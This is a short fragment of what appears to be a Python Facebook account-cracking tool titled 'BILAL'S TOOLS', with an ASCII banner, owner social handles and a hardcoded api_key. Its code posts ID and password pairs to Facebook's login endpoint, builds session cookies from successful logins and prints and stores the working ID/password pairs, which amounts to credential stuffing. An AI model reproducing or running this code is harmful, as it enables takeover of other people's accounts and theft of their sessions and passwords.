...
Y8888P' Y888888P Y88888P YP   YP Y88888P 
                     ...
                     🌝🌝🌝
 ASSALAM-O-ALIKUM WELLCOME TO BILAL'S TOOLS
                            
 \033[1;37m Owner   :            MR BILAL
 \033[1;37m Facebook:            TRICKER MR BILAL🌝
 \033[1;37m Github  :            BILAL-787000
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'viewport-width': '980',}
                q = session.post("p.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [RSJ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
